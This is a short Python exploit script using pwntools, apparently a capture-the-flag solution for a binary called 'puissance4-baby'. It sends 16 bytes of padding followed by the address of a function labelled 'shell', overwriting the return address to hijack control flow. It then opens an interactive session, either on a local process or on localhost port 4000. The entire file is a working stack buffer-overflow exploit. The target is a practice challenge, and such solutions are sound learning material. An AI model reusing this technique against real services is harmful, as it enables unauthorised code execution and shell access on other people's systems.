from pwn import * 

context.log_level = 'info'

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process('./puissance4-baby')

offset = 16

shell = 0x4011d6

log.info(p64(shell))

payload = b'A' * offset + p64(shell)
log.info(payload)

io.sendline(payload)
io.interactive()